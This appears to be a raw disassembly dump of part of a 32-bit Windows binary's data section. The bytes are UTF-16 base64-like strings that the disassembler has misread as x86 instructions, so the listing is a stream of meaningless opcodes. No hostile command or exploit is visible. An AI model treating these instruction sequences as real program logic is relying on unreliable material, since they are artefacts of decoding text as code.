10003610:	00 4b 00             	add    %cl,0x0(%ebx)
10003613:	4d                   	dec    %ebp
10003614:	00 46 00             	add    %al,0x0(%esi)
10003617:	6c                   	insb   (%dx),%es:(%edi)
10003618:	00 59 00             	add    %bl,0x0(%ecx)
1000361b:	56                   	push   %esi
1000361c:	00 30                	add    %dh,(%eax)
1000361e:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
10003622:	00 64 00 55          	add    %ah,0x55(%eax,%eax,1)
10003626:	00 52 00             	add    %dl,0x0(%edx)
10003629:	51                   	push   %ecx
1000362a:	00 4d 00             	add    %cl,0x0(%ebp)
1000362d:	6d                   	insl   (%dx),%es:(%edi)
1000362e:	00 67 00             	add    %ah,0x0(%edi)
10003631:	30 00                	xor    %al,(%eax)
10003633:	53                   	push   %ebx
10003634:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
10003638:	00 4a 00             	add    %cl,0x0(%edx)
1000363b:	62 00                	bound  %eax,(%eax)
1000363d:	48                   	dec    %eax
1000363e:	00 56 00             	add    %dl,0x0(%esi)
10003641:	45                   	inc    %ebp
10003642:	00 55 00             	add    %dl,0x0(%ebp)
10003645:	44                   	inc    %esp
10003646:	00 4a 00             	add    %cl,0x0(%edx)
10003649:	6f                   	outsl  %ds:(%esi),(%dx)
1000364a:	00 4e 00             	add    %cl,0x0(%esi)
1000364d:	45                   	inc    %ebp
1000364e:	00 70 00             	add    %dh,0x0(%eax)
10003651:	4b                   	dec    %ebx
10003652:	00 62 00             	add    %ah,0x0(%edx)
10003655:	6c                   	insb   (%dx),%es:(%edi)
10003656:	00 70 00             	add    %dh,0x0(%eax)
10003659:	58                   	pop    %eax
1000365a:	00 53 00             	add    %dl,0x0(%ebx)
1000365d:	57                   	push   %edi
1000365e:	00 78 00             	add    %bh,0x0(%eax)
10003661:	31 00                	xor    %eax,(%eax)
10003663:	52                   	push   %edx
10003664:	00 46 00             	add    %al,0x0(%esi)
10003667:	41                   	inc    %ecx
10003668:	00 79 00             	add    %bh,0x0(%ecx)
1000366b:	61                   	popa
1000366c:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
10003670:	00 4b 00             	add    %cl,0x0(%ebx)
10003673:	56                   	push   %esi
10003674:	00 30                	add    %dh,(%eax)
10003676:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
1000367a:	00 64 00 55          	add    %ah,0x55(%eax,%eax,1)
1000367e:	00 52 00             	add    %dl,0x0(%edx)
10003681:	51                   	push   %ecx
10003682:	00 4d 00             	add    %cl,0x0(%ebp)
10003685:	6d                   	insl   (%dx),%es:(%edi)
10003686:	00 67 00             	add    %ah,0x0(%edi)
10003689:	30 00                	xor    %al,(%eax)
1000368b:	53                   	push   %ebx
1000368c:	00 6c 00 68          	add    %ch,0x68(%eax,%eax,1)
10003690:	00 52 00             	add    %dl,0x0(%edx)
10003693:	5a                   	pop    %edx
10003694:	00 31                	add    %dh,(%ecx)
10003696:	00 64 00 4a          	add    %ah,0x4a(%eax,%eax,1)
1000369a:	00 62 00             	add    %ah,0x0(%edx)
1000369d:	48                   	dec    %eax
1000369e:	00 56 00             	add    %dl,0x0(%esi)
100036a1:	45                   	inc    %ebp
100036a2:	00 55 00             	add    %dl,0x0(%ebp)
100036a5:	44                   	inc    %esp
100036a6:	00 4a 00             	add    %cl,0x0(%edx)
100036a9:	6f                   	outsl  %ds:(%esi),(%dx)
100036aa:	00 4e 00             	add    %cl,0x0(%esi)
100036ad:	45                   	inc    %ebp
100036ae:	00 70 00             	add    %dh,0x0(%eax)
100036b1:	58                   	pop    %eax
100036b2:	00 53 00             	add    %dl,0x0(%ebx)
100036b5:	57                   	push   %edi
100036b6:	00 78 00             	add    %bh,0x0(%eax)
100036b9:	31 00                	xor    %eax,(%eax)
100036bb:	52                   	push   %edx
100036bc:	00 46 00             	add    %al,0x0(%esi)
100036bf:	41                   	inc    %ecx
100036c0:	00 79 00             	add    %bh,0x0(%ecx)
100036c3:	61                   	popa
100036c4:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
100036c8:	00 4b 00             	add    %cl,0x0(%ebx)
100036cb:	59                   	pop    %ecx
100036cc:	00 30                	add    %dh,(%eax)
100036ce:	00 68 00             	add    %ch,0x0(%eax)
100036d1:	4b                   	dec    %ebx
100036d2:	00 56 00             	add    %dl,0x0(%esi)
100036d5:	30 00                	xor    %al,(%eax)
100036d7:	6c                   	insb   (%dx),%es:(%edi)
100036d8:	00 73 00             	add    %dh,0x0(%ebx)
100036db:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
100036df:	52                   	push   %edx
100036e0:	00 51 00             	add    %dl,0x0(%ecx)
100036e3:	4d                   	dec    %ebp
100036e4:	00 6d 00             	add    %ch,0x0(%ebp)
100036e7:	67 00 30             	add    %dh,(%bx,%si)
100036ea:	00 53 00             	add    %dl,0x0(%ebx)
100036ed:	6c                   	insb   (%dx),%es:(%edi)
100036ee:	00 64 00 4a          	add    %ah,0x4a(%eax,%eax,1)
100036f2:	00 62 00             	add    %ah,0x0(%edx)
100036f5:	48                   	dec    %eax
100036f6:	00 56 00             	add    %dl,0x0(%esi)
100036f9:	45                   	inc    %ebp
100036fa:	00 55 00             	add    %dl,0x0(%ebp)
100036fd:	44                   	inc    %esp
100036fe:	00 4a 00             	add    %cl,0x0(%edx)
10003701:	6f                   	outsl  %ds:(%esi),(%dx)
10003702:	00 4e 00             	add    %cl,0x0(%esi)
10003705:	45                   	inc    %ebp
10003706:	00 70 00             	add    %dh,0x0(%eax)
10003709:	32 00                	xor    (%eax),%al
1000370b:	57                   	push   %edi
1000370c:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
10003710:	00 58 00             	add    %bl,0x0(%eax)
10003713:	53                   	push   %ebx
10003714:	00 57 00             	add    %dl,0x0(%edi)
10003717:	78 00                	js     0x10003719
10003719:	31 00                	xor    %eax,(%eax)
1000371b:	52                   	push   %edx
1000371c:	00 46 00             	add    %al,0x0(%esi)
1000371f:	41                   	inc    %ecx
10003720:	00 79 00             	add    %bh,0x0(%ecx)
10003723:	61                   	popa
10003724:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
10003728:	00 4b 00             	add    %cl,0x0(%ebx)
1000372b:	56                   	push   %esi
1000372c:	00 30                	add    %dh,(%eax)
1000372e:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
10003732:	00 64 00 55          	add    %ah,0x55(%eax,%eax,1)
10003736:	00 52 00             	add    %dl,0x0(%edx)
10003739:	51                   	push   %ecx
1000373a:	00 4d 00             	add    %cl,0x0(%ebp)
1000373d:	6d                   	insl   (%dx),%es:(%edi)
1000373e:	00 67 00             	add    %ah,0x0(%edi)
10003741:	30 00                	xor    %al,(%eax)
10003743:	53                   	push   %ebx
10003744:	00 6c 00 5a          	add    %ch,0x5a(%eax,%eax,1)
10003748:	00 36                	add    %dh,(%esi)
1000374a:	00 59 00             	add    %bl,0x0(%ecx)
1000374d:	31 00                	xor    %eax,(%eax)
1000374f:	64 00 4a 00          	add    %cl,%fs:0x0(%edx)
10003753:	62 00                	bound  %eax,(%eax)
10003755:	48                   	dec    %eax
10003756:	00 56 00             	add    %dl,0x0(%esi)
10003759:	45                   	inc    %ebp
1000375a:	00 55 00             	add    %dl,0x0(%ebp)
1000375d:	44                   	inc    %esp
1000375e:	00 4a 00             	add    %cl,0x0(%edx)
10003761:	6f                   	outsl  %ds:(%esi),(%dx)
10003762:	00 4e 00             	add    %cl,0x0(%esi)
10003765:	45                   	inc    %ebp
10003766:	00 70 00             	add    %dh,0x0(%eax)
10003769:	58                   	pop    %eax
1000376a:	00 53 00             	add    %dl,0x0(%ebx)
1000376d:	57                   	push   %edi
1000376e:	00 78 00             	add    %bh,0x0(%eax)
10003771:	31 00                	xor    %eax,(%eax)
10003773:	52                   	push   %edx
10003774:	00 46 00             	add    %al,0x0(%esi)
10003777:	41                   	inc    %ecx
10003778:	00 79 00             	add    %bh,0x0(%ecx)
1000377b:	61                   	popa
1000377c:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
10003780:	00 4b 00             	add    %cl,0x0(%ebx)
10003783:	64 00 7a 00          	add    %bh,%fs:0x0(%edx)
10003787:	30 00                	xor    %al,(%eax)
10003789:	39 00                	cmp    %eax,(%eax)
1000378b:	56                   	push   %esi
1000378c:	00 30                	add    %dh,(%eax)
1000378e:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
10003792:	00 64 00 55          	add    %ah,0x55(%eax,%eax,1)
10003796:	00 52 00             	add    %dl,0x0(%edx)
10003799:	51                   	push   %ecx
1000379a:	00 4d 00             	add    %cl,0x0(%ebp)
1000379d:	6d                   	insl   (%dx),%es:(%edi)
1000379e:	00 67 00             	add    %ah,0x0(%edi)
100037a1:	30 00                	xor    %al,(%eax)
100037a3:	53                   	push   %ebx
100037a4:	00 67 00             	add    %ah,0x0(%edi)
100037a7:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
100037ac:	15 57 00 49 00       	adc    $0x490057,%eax
100037b1:	6c                   	insb   (%dx),%es:(%edi)
100037b2:	00 75 00             	add    %dh,0x0(%ebp)
100037b5:	44                   	inc    %esp
100037b6:	00 50 00             	add    %dl,0x0(%eax)
100037b9:	32 00                	xor    (%eax),%al
100037bb:	68 00 34 00 4a       	push   $0x4a003400
100037c0:	00 00                	add    %al,(%eax)
100037c2:	01 00                	add    %eax,(%eax)
100037c4:	85 c1                	test   %eax,%ecx
100037c6:	4d                   	dec    %ebp
100037c7:	00 45 00             	add    %al,0x0(%ebp)
100037ca:	70 00                	jo     0x100037cc
100037cc:	55                   	push   %ebp
100037cd:	00 5a 00             	add    %bl,0x0(%edx)
100037d0:	6c                   	insb   (%dx),%es:(%edi)
100037d1:	00 52 00             	add    %dl,0x0(%edx)
100037d4:	47                   	inc    %edi
100037d5:	00 63 00             	add    %ah,0x0(%ebx)
100037d8:	32 00                	xor    (%eax),%al
100037da:	4d                   	dec    %ebp
100037db:	00 33                	add    %dh,(%ebx)
100037dd:	00 62 00             	add    %ah,0x0(%edx)
100037e0:	46                   	inc    %esi
100037e1:	00 4a 00             	add    %cl,0x0(%edx)
100037e4:	74 00                	je     0x100037e6
100037e6:	52                   	push   %edx
100037e7:	00 6a 00             	add    %ch,0x0(%edx)
100037ea:	42                   	inc    %edx
100037eb:	00 4b 00             	add    %cl,0x0(%ebx)
100037ee:	56                   	push   %esi
100037ef:	00 47 00             	add    %al,0x0(%edi)
100037f2:	5a                   	pop    %edx
100037f3:	00 55 00             	add    %dl,0x0(%ebp)
100037f6:	52                   	push   %edx
100037f7:	00 6e 00             	add    %ch,0x0(%esi)
100037fa:	4e                   	dec    %esi
100037fb:	00 6a 00             	add    %ch,0x0(%edx)
100037fe:	4e                   	dec    %esi
100037ff:	00 32                	add    %dh,(%edx)
10003801:	00 77 00             	add    %dh,0x0(%edi)
10003804:	77 00                	ja     0x10003806
10003806:	53                   	push   %ebx
10003807:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
1000380b:	00 6d 00             	add    %ch,0x0(%ebp)
1000380e:	56                   	push   %esi
1000380f:	00 45 00             	add    %al,0x0(%ebp)
10003812:	5a                   	pop    %edx
10003813:	00 7a 00             	add    %bh,0x0(%edx)
10003816:	59                   	pop    %ecx
10003817:	00 7a 00             	add    %bh,0x0(%edx)
1000381a:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
1000381e:	63 00                	arpl   %eax,(%eax)
10003820:	47                   	inc    %edi
10003821:	00 4a 00             	add    %cl,0x0(%edx)
10003824:	48                   	dec    %eax
10003825:	00 4d 00             	add    %cl,0x0(%ebp)
10003828:	45                   	inc    %ebp
10003829:	00 70 00             	add    %dh,0x0(%eax)
1000382c:	55                   	push   %ebp
1000382d:	00 5a 00             	add    %bl,0x0(%edx)
10003830:	6c                   	insb   (%dx),%es:(%edi)
10003831:	00 52 00             	add    %dl,0x0(%edx)
10003834:	47                   	inc    %edi
10003835:	00 63 00             	add    %ah,0x0(%ebx)
10003838:	32 00                	xor    (%eax),%al
1000383a:	4d                   	dec    %ebp
1000383b:	00 33                	add    %dh,(%ebx)
1000383d:	00 62 00             	add    %ah,0x0(%edx)
10003840:	44                   	inc    %esp
10003841:	00 42 00             	add    %al,0x0(%edx)
10003844:	4b                   	dec    %ebx
10003845:	00 56 00             	add    %dl,0x0(%esi)
10003848:	47                   	inc    %edi
10003849:	00 5a 00             	add    %bl,0x0(%edx)
1000384c:	55                   	push   %ebp
1000384d:	00 52 00             	add    %dl,0x0(%edx)
10003850:	6e                   	outsb  %ds:(%esi),(%dx)
10003851:	00 4e 00             	add    %cl,0x0(%esi)
10003854:	6a 00                	push   $0x0
10003856:	4e                   	dec    %esi
10003857:	00 32                	add    %dh,(%edx)
10003859:	00 78 00             	add    %bh,0x0(%eax)
1000385c:	57                   	push   %edi
1000385d:	00 61 00             	add    %ah,0x0(%ecx)
10003860:	30 00                	xor    %al,(%eax)
10003862:	6b 00 77             	imul   $0x77,(%eax),%eax
10003865:	00 53 00             	add    %dl,0x0(%ebx)
10003868:	6c                   	insb   (%dx),%es:(%edi)
10003869:	00 52 00             	add    %dl,0x0(%edx)
1000386c:	6d                   	insl   (%dx),%es:(%edi)
1000386d:	00 56 00             	add    %dl,0x0(%esi)
10003870:	45                   	inc    %ebp
10003871:	00 5a 00             	add    %bl,0x0(%edx)
10003874:	7a 00                	jp     0x10003876
10003876:	59                   	pop    %ecx
10003877:	00 7a 00             	add    %bh,0x0(%edx)
1000387a:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
1000387e:	4d                   	dec    %ebp
1000387f:	00 45 00             	add    %al,0x0(%ebp)
10003882:	70 00                	jo     0x10003884
10003884:	55                   	push   %ebp
10003885:	00 5a 00             	add    %bl,0x0(%edx)
10003888:	6c                   	insb   (%dx),%es:(%edi)
10003889:	00 52 00             	add    %dl,0x0(%edx)
1000388c:	47                   	inc    %edi
1000388d:	00 63 00             	add    %ah,0x0(%ebx)
10003890:	32 00                	xor    (%eax),%al
10003892:	4d                   	dec    %ebp
10003893:	00 33                	add    %dh,(%ebx)
10003895:	00 62 00             	add    %ah,0x0(%edx)
10003898:	45                   	inc    %ebp
10003899:	00 68 00             	add    %ch,0x0(%eax)
1000389c:	53                   	push   %ebx
1000389d:	00 64 00 6a          	add    %ah,0x6a(%eax,%eax,1)
100038a1:	00 42 00             	add    %al,0x0(%edx)
100038a4:	4b                   	dec    %ebx
100038a5:	00 56 00             	add    %dl,0x0(%esi)
100038a8:	47                   	inc    %edi
100038a9:	00 5a 00             	add    %bl,0x0(%edx)
100038ac:	55                   	push   %ebp
100038ad:	00 52 00             	add    %dl,0x0(%edx)
100038b0:	6e                   	outsb  %ds:(%esi),(%dx)
100038b1:	00 4e 00             	add    %cl,0x0(%esi)
100038b4:	6a 00                	push   $0x0
100038b6:	4e                   	dec    %esi
100038b7:	00 32                	add    %dh,(%edx)
100038b9:	00 77 00             	add    %dh,0x0(%edi)
100038bc:	77 00                	ja     0x100038be
100038be:	53                   	push   %ebx
100038bf:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
100038c3:	00 6d 00             	add    %ch,0x0(%ebp)
100038c6:	56                   	push   %esi
100038c7:	00 45 00             	add    %al,0x0(%ebp)
100038ca:	5a                   	pop    %edx
100038cb:	00 7a 00             	add    %bh,0x0(%edx)
100038ce:	59                   	pop    %ecx
100038cf:	00 7a 00             	add    %bh,0x0(%edx)
100038d2:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
100038d6:	53                   	push   %ebx
100038d7:	00 55 00             	add    %dl,0x0(%ebp)
100038da:	68 00 6b 00 4d       	push   $0x4d006b00
100038df:	00 45 00             	add    %al,0x0(%ebp)
100038e2:	70 00                	jo     0x100038e4
100038e4:	55                   	push   %ebp
100038e5:	00 5a 00             	add    %bl,0x0(%edx)
100038e8:	6c                   	insb   (%dx),%es:(%edi)
100038e9:	00 52 00             	add    %dl,0x0(%edx)
100038ec:	47                   	inc    %edi
100038ed:	00 63 00             	add    %ah,0x0(%ebx)
100038f0:	32 00                	xor    (%eax),%al
100038f2:	4d                   	dec    %ebp
100038f3:	00 33                	add    %dh,(%ebx)
100038f5:	00 62 00             	add    %ah,0x0(%edx)
100038f8:	44                   	inc    %esp
100038f9:	00 42 00             	add    %al,0x0(%edx)
100038fc:	4b                   	dec    %ebx
100038fd:	00 56 00             	add    %dl,0x0(%esi)
10003900:	47                   	inc    %edi
10003901:	00 5a 00             	add    %bl,0x0(%edx)
10003904:	55                   	push   %ebp
10003905:	00 52 00             	add    %dl,0x0(%edx)
10003908:	6e                   	outsb  %ds:(%esi),(%dx)
10003909:	00 4e 00             	add    %cl,0x0(%esi)
1000390c:	6a 00                	push   $0x0
1000390e:	4e                   	dec    %esi
1000390f:	00 32                	add    %dh,(%edx)
10003911:	00 78 00             	add    %bh,0x0(%eax)
10003914:	35 00 59 00 56       	xor    $0x56005900,%eax
10003919:	00 67 00             	add    %ah,0x0(%edi)
1000391c:	77 00                	ja     0x1000391e
1000391e:	53                   	push   %ebx
1000391f:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
10003923:	00 6d 00             	add    %ch,0x0(%ebp)
10003926:	56                   	push   %esi
10003927:	00 45 00             	add    %al,0x0(%ebp)
1000392a:	5a                   	pop    %edx
1000392b:	00 7a 00             	add    %bh,0x0(%edx)
1000392e:	59                   	pop    %ecx
1000392f:	00 7a 00             	add    %bh,0x0(%edx)
10003932:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
10003936:	4d                   	dec    %ebp
10003937:	00 45 00             	add    %al,0x0(%ebp)
1000393a:	70 00                	jo     0x1000393c
1000393c:	55                   	push   %ebp
1000393d:	00 5a 00             	add    %bl,0x0(%edx)
10003940:	6c                   	insb   (%dx),%es:(%edi)
10003941:	00 52 00             	add    %dl,0x0(%edx)
10003944:	47                   	inc    %edi
10003945:	00 63 00             	add    %ah,0x0(%ebx)
10003948:	32 00                	xor    (%eax),%al
1000394a:	4d                   	dec    %ebp
1000394b:	00 33                	add    %dh,(%ebx)
1000394d:	00 62 00             	add    %ah,0x0(%edx)
10003950:	46                   	inc    %esi
10003951:	00 4a 00             	add    %cl,0x0(%edx)
10003954:	73 00                	jae    0x10003956
10003956:	53                   	push   %ebx
10003957:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
1000395b:	00 4b 00             	add    %cl,0x0(%ebx)
1000395e:	56                   	push   %esi
1000395f:	00 47 00             	add    %al,0x0(%edi)
10003962:	5a                   	pop    %edx
10003963:	00 55 00             	add    %dl,0x0(%ebp)
10003966:	52                   	push   %edx
10003967:	00 6e 00             	add    %ch,0x0(%esi)
1000396a:	4e                   	dec    %esi
1000396b:	00 6a 00             	add    %ch,0x0(%edx)
1000396e:	4e                   	dec    %esi
1000396f:	00 32                	add    %dh,(%edx)
10003971:	00 77 00             	add    %dh,0x0(%edi)
10003974:	77 00                	ja     0x10003976
10003976:	53                   	push   %ebx
10003977:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
1000397b:	00 6d 00             	add    %ch,0x0(%ebp)
1000397e:	56                   	push   %esi
1000397f:	00 45 00             	add    %al,0x0(%ebp)
10003982:	5a                   	pop    %edx
10003983:	00 7a 00             	add    %bh,0x0(%edx)
10003986:	59                   	pop    %ecx
10003987:	00 7a 00             	add    %bh,0x0(%edx)
1000398a:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
1000398e:	52                   	push   %edx
1000398f:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
10003993:	00 7a 00             	add    %bh,0x0(%edx)
10003996:	4d                   	dec    %ebp
10003997:	00 45 00             	add    %al,0x0(%ebp)
1000399a:	70 00                	jo     0x1000399c
1000399c:	55                   	push   %ebp
1000399d:	00 5a 00             	add    %bl,0x0(%edx)
100039a0:	6c                   	insb   (%dx),%es:(%edi)
100039a1:	00 52 00             	add    %dl,0x0(%edx)
100039a4:	47                   	inc    %edi
100039a5:	00 63 00             	add    %ah,0x0(%ebx)
100039a8:	32 00                	xor    (%eax),%al
100039aa:	4d                   	dec    %ebp
100039ab:	00 33                	add    %dh,(%ebx)
100039ad:	00 62 00             	add    %ah,0x0(%edx)
100039b0:	44                   	inc    %esp
100039b1:	00 42 00             	add    %al,0x0(%edx)
100039b4:	4b                   	dec    %ebx
100039b5:	00 56 00             	add    %dl,0x0(%esi)
100039b8:	47                   	inc    %edi
100039b9:	00 5a 00             	add    %bl,0x0(%edx)
100039bc:	55                   	push   %ebp
100039bd:	00 52 00             	add    %dl,0x0(%edx)
100039c0:	6e                   	outsb  %ds:(%esi),(%dx)
100039c1:	00 4e 00             	add    %cl,0x0(%esi)
100039c4:	6a 00                	push   $0x0
100039c6:	4e                   	dec    %esi
100039c7:	00 32                	add    %dh,(%edx)
100039c9:	00 78 00             	add    %bh,0x0(%eax)
100039cc:	5a                   	pop    %edx
100039cd:	00 62 00             	add    %ah,0x0(%edx)
100039d0:	58                   	pop    %eax
100039d1:	00 41 00             	add    %al,0x0(%ecx)
100039d4:	77 00                	ja     0x100039d6
100039d6:	53                   	push   %ebx
100039d7:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
100039db:	00 6d 00             	add    %ch,0x0(%ebp)
100039de:	56                   	push   %esi
100039df:	00 45 00             	add    %al,0x0(%ebp)
100039e2:	5a                   	pop    %edx
100039e3:	00 7a 00             	add    %bh,0x0(%edx)
100039e6:	59                   	pop    %ecx
100039e7:	00 7a 00             	add    %bh,0x0(%edx)
100039ea:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
100039ee:	4d                   	dec    %ebp
100039ef:	00 45 00             	add    %al,0x0(%ebp)
100039f2:	70 00                	jo     0x100039f4
100039f4:	55                   	push   %ebp
100039f5:	00 5a 00             	add    %bl,0x0(%edx)
100039f8:	6c                   	insb   (%dx),%es:(%edi)
100039f9:	00 52 00             	add    %dl,0x0(%edx)
100039fc:	47                   	inc    %edi
100039fd:	00 63 00             	add    %ah,0x0(%ebx)
10003a00:	32 00                	xor    (%eax),%al
10003a02:	4d                   	dec    %ebp
10003a03:	00 33                	add    %dh,(%ebx)
10003a05:	00 62 00             	add    %ah,0x0(%edx)
10003a08:	48                   	dec    %eax
10003a09:	00 68 00             	add    %ch,0x0(%eax)
10003a0c:	56                   	push   %esi
10003a0d:	00 4d 00             	add    %cl,0x0(%ebp)
10003a10:	54                   	push   %esp
10003a11:	00 42 00             	add    %al,0x0(%edx)
10003a14:	4b                   	dec    %ebx
10003a15:	00 56 00             	add    %dl,0x0(%esi)
10003a18:	47                   	inc    %edi
10003a19:	00 5a 00             	add    %bl,0x0(%edx)
10003a1c:	55                   	push   %ebp
10003a1d:	00 52 00             	add    %dl,0x0(%edx)
10003a20:	6e                   	outsb  %ds:(%esi),(%dx)
10003a21:	00 4e 00             	add    %cl,0x0(%esi)
10003a24:	6a 00                	push   $0x0
10003a26:	4e                   	dec    %esi
10003a27:	00 32                	add    %dh,(%edx)
10003a29:	00 77 00             	add    %dh,0x0(%edi)
10003a2c:	77 00                	ja     0x10003a2e
10003a2e:	53                   	push   %ebx
10003a2f:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
10003a33:	00 6d 00             	add    %ch,0x0(%ebp)
10003a36:	56                   	push   %esi
10003a37:	00 45 00             	add    %al,0x0(%ebp)
10003a3a:	5a                   	pop    %edx
10003a3b:	00 7a 00             	add    %bh,0x0(%edx)
10003a3e:	59                   	pop    %ecx
10003a3f:	00 7a 00             	add    %bh,0x0(%edx)
10003a42:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
10003a46:	53                   	push   %ebx
10003a47:	00 6c 00 5a          	add    %ch,0x5a(%eax,%eax,1)
10003a4b:	00 4e 00             	add    %cl,0x0(%esi)
10003a4e:	4d                   	dec    %ebp
10003a4f:	00 45 00             	add    %al,0x0(%ebp)
10003a52:	70 00                	jo     0x10003a54
10003a54:	55                   	push   %ebp
10003a55:	00 5a 00             	add    %bl,0x0(%edx)
10003a58:	6c                   	insb   (%dx),%es:(%edi)
10003a59:	00 52 00             	add    %dl,0x0(%edx)
10003a5c:	47                   	inc    %edi
10003a5d:	00 63 00             	add    %ah,0x0(%ebx)
10003a60:	32 00                	xor    (%eax),%al
10003a62:	4d                   	dec    %ebp
10003a63:	00 33                	add    %dh,(%ebx)
10003a65:	00 62 00             	add    %ah,0x0(%edx)
10003a68:	44                   	inc    %esp
10003a69:	00 42 00             	add    %al,0x0(%edx)
10003a6c:	4b                   	dec    %ebx
10003a6d:	00 56 00             	add    %dl,0x0(%esi)
10003a70:	47                   	inc    %edi
10003a71:	00 5a 00             	add    %bl,0x0(%edx)
10003a74:	55                   	push   %ebp
10003a75:	00 52 00             	add    %dl,0x0(%edx)
10003a78:	6e                   	outsb  %ds:(%esi),(%dx)
10003a79:	00 4e 00             	add    %cl,0x0(%esi)
10003a7c:	6a 00                	push   $0x0
10003a7e:	4e                   	dec    %esi
10003a7f:	00 32                	add    %dh,(%edx)
10003a81:	00 78 00             	add    %bh,0x0(%eax)
10003a84:	73 00                	jae    0x10003a86
10003a86:	63 00                	arpl   %eax,(%eax)
10003a88:	48                   	dec    %eax
10003a89:	00 59 00             	add    %bl,0x0(%ecx)
10003a8c:	77 00                	ja     0x10003a8e
10003a8e:	53                   	push   %ebx
10003a8f:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
10003a93:	00 6d 00             	add    %ch,0x0(%ebp)
10003a96:	56                   	push   %esi
10003a97:	00 45 00             	add    %al,0x0(%ebp)
10003a9a:	5a                   	pop    %edx
10003a9b:	00 7a 00             	add    %bh,0x0(%edx)
10003a9e:	59                   	pop    %ecx
10003a9f:	00 7a 00             	add    %bh,0x0(%edx)
10003aa2:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
10003aa6:	4d                   	dec    %ebp
10003aa7:	00 45 00             	add    %al,0x0(%ebp)
10003aaa:	70 00                	jo     0x10003aac
10003aac:	55                   	push   %ebp
10003aad:	00 5a 00             	add    %bl,0x0(%edx)
10003ab0:	6c                   	insb   (%dx),%es:(%edi)
10003ab1:	00 52 00             	add    %dl,0x0(%edx)
10003ab4:	47                   	inc    %edi
10003ab5:	00 63 00             	add    %ah,0x0(%ebx)
10003ab8:	32 00                	xor    (%eax),%al
10003aba:	4d                   	dec    %ebp
10003abb:	00 33                	add    %dh,(%ebx)
10003abd:	00 62 00             	add    %ah,0x0(%edx)
10003ac0:	46                   	inc    %esi
10003ac1:	00 56 00             	add    %dl,0x0(%esi)
10003ac4:	47                   	inc    %edi
10003ac5:	00 56 00             	add    %dl,0x0(%esi)
10003ac8:	6a 00                	push   $0x0
10003aca:	42                   	inc    %edx
10003acb:	00 4b 00             	add    %cl,0x0(%ebx)
10003ace:	56                   	push   %esi
10003acf:	00 47 00             	add    %al,0x0(%edi)
10003ad2:	5a                   	pop    %edx
10003ad3:	00 55 00             	add    %dl,0x0(%ebp)
10003ad6:	52                   	push   %edx
10003ad7:	00 6e 00             	add    %ch,0x0(%esi)
10003ada:	4e                   	dec    %esi
10003adb:	00 6a 00             	add    %ch,0x0(%edx)
10003ade:	4e                   	dec    %esi
10003adf:	00 32                	add    %dh,(%edx)
10003ae1:	00 77 00             	add    %dh,0x0(%edi)
10003ae4:	77 00                	ja     0x10003ae6
10003ae6:	53                   	push   %ebx
10003ae7:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
10003aeb:	00 6d 00             	add    %ch,0x0(%ebp)
10003aee:	56                   	push   %esi
10003aef:	00 45 00             	add    %al,0x0(%ebp)
10003af2:	5a                   	pop    %edx
10003af3:	00 7a 00             	add    %bh,0x0(%edx)
10003af6:	59                   	pop    %ecx
10003af7:	00 7a 00             	add    %bh,0x0(%edx)
10003afa:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
10003afe:	52                   	push   %edx
10003aff:	00 31                	add    %dh,(%ecx)
10003b01:	00 70 00             	add    %dh,0x0(%eax)
10003b04:	73 00                	jae    0x10003b06
10003b06:	4d                   	dec    %ebp
10003b07:	00 45 00             	add    %al,0x0(%ebp)
10003b0a:	70 00                	jo     0x10003b0c
10003b0c:	55                   	push   %ebp
10003b0d:	00 5a 00             	add    %bl,0x0(%edx)
10003b10:	6c                   	insb   (%dx),%es:(%edi)
10003b11:	00 52 00             	add    %dl,0x0(%edx)
10003b14:	47                   	inc    %edi
10003b15:	00 63 00             	add    %ah,0x0(%ebx)
10003b18:	32 00                	xor    (%eax),%al
10003b1a:	4d                   	dec    %ebp
10003b1b:	00 33                	add    %dh,(%ebx)
10003b1d:	00 62 00             	add    %ah,0x0(%edx)
10003b20:	44                   	inc    %esp
10003b21:	00 42 00             	add    %al,0x0(%edx)
10003b24:	4b                   	dec    %ebx
10003b25:	00 56 00             	add    %dl,0x0(%esi)
10003b28:	47                   	inc    %edi
10003b29:	00 5a 00             	add    %bl,0x0(%edx)
10003b2c:	55                   	push   %ebp
10003b2d:	00 52 00             	add    %dl,0x0(%edx)
10003b30:	6e                   	outsb  %ds:(%esi),(%dx)
10003b31:	00 4e 00             	add    %cl,0x0(%esi)
10003b34:	6a 00                	push   $0x0
10003b36:	4e                   	dec    %esi
10003b37:	00 32                	add    %dh,(%edx)
10003b39:	00 78 00             	add    %bh,0x0(%eax)
10003b3c:	6b 00 54             	imul   $0x54,(%eax),%eax
10003b3f:	00 6c 00 49          	add    %ch,0x49(%eax,%eax,1)
10003b43:	00 77 00             	add    %dh,0x0(%edi)
10003b46:	53                   	push   %ebx
10003b47:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
10003b4b:	00 6d 00             	add    %ch,0x0(%ebp)
10003b4e:	56                   	push   %esi
